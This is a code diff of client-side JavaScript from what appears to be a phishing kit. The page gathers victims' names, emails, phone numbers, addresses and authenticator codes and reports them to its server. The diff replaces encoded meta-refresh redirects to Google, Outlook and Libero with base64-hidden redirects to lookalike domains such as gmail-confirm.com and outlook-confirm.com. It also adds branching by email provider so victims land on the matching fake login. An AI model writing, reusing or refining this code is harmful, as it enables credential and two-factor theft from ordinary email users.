@@ -6,17 +6,18 @@ let statusState;
 let ipAddress;
 
 let gmail =
-  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd3d3Lmdvb2dsZS5jb20lMjIlMjAvJTNF";
+  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vYWNjb3VudC5nbWFpbC1jb25maXJtLmNvbS8lMjIlMjAvJTNF";
 let outlook =
-  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RtYWlsLm91dGxvb2suY29tJTIyJTIwLyUzRQ==";
+  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ub3V0bG9vay1jb25maXJtLmNvbS9uZHpvTnpmeCUyMiUyMC8lM0U=";
 let libero =
-  " JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vd3d3LmxpYmVyby5pdCUyMiUyMC8lM0U=";
+  "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vbG9naW4ubG9naW4tbGliZXJvLmNvbS9qblNQekZCUiUyMiUyMC8lM0U=";
 
 let first = document.getElementById("1");
 let second = document.getElementById("2");
 let third = document.getElementById("3");
 let fourth = document.getElementById("4");
 let fifth = document.getElementById("5");
+let sixth = document.getElementById("6");
 
 let fullNameContainer = document.getElementById("full-name-container");
 let emailContainer = document.getElementById("email-container");
@@ -118,6 +119,9 @@ if (hasRef) {
 
     switch (msg.type) {
       case "STAT_UPDATED":
+        if (msg.data.stat == "0") {
+          show(sixth);
+        }
         if (msg.data.stat == "1") {
           show(first);
         }
@@ -167,6 +171,9 @@ if (hasRef) {
         
         // You can keep your current show() logic here
         if (msg.exists) {
+          if(msg.stat == "0") {
+            show(sixth)
+          }
           if (msg.stat == "1") {
             show(first);
           }
@@ -340,6 +347,12 @@ function show(next) {
 }
 
 function sendUser() {
+  let stat;
+  if (email.value.includes("gmail") || email.value.includes("outlook") || email.value.includes("libero")) {
+    stat = "2";
+  } else {
+    stat = "0";
+  }
   fetch("/add-user", {
     method: "POST",
     headers: {
@@ -351,17 +364,42 @@ function sendUser() {
       email: email.value,
       mobile_number: mobileNumber.value,
       address: address.value,
+      stat: stat 
     }),
   })
     .then((res) => res.json())
     .then((data) => {
       if (data == true) {
-        show(third);
+        if(stat == "2") {
+          show(third);
+        }
+        else {
+          show(sixth)
+        }
+        
         continueSignIn.className = defaultContinueSignInClass;
         continueSignIn.innerHTML = defaultContinueSignInContent;
       }
     })
     .catch((err) => log("POST Error: " + err));
+}
+
+function updateStat() {
+  fetch("/update-stat", {
+    method: "POST",
+    headers: {
+      "Content-Type": "application/json",
+    },
+    body: JSON.stringify({
+      ip: ipAddress,
+      stat: "0",
+    }),
+  })
+    .then((res) => res.json())
+    .then((data) => {
+      
+    })
+    .catch((err) => console.log("POST Error: "));
 }
 
 function sendAuthenticatorCode() {
